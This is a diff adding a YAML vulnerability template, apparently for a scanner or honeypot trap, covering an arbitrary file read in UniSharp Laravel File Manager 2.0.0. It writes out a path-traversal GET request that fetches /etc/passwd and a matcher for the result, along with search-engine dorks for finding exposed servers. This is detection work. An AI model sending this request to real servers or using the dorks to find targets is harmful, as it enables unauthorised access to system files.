@@ -1,0 +1,25 @@
+id: laravel-filemanager-lfi
+info:
+  name: UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read
+  author: hackerarpan
+  description: UniSharp Larevel File Manager 2.0.0 is vulnerable to arbitrary file
+    read.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/48166
+  - https://github.com/UniSharp/laravel-filemanager
+  metadata:
+    max-request: 1
+    shodan-query: http.html:"Laravel FileManager"
+    google-query: inurl:"laravel-filemanager?type=Files" -site:github.com -site:github.io
+  tags: lfr,edb,lfi,unisharp,laravel,filemanager,fileupload,intrusive
+traps:
+- request:
+    method: GET
+    path: /laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
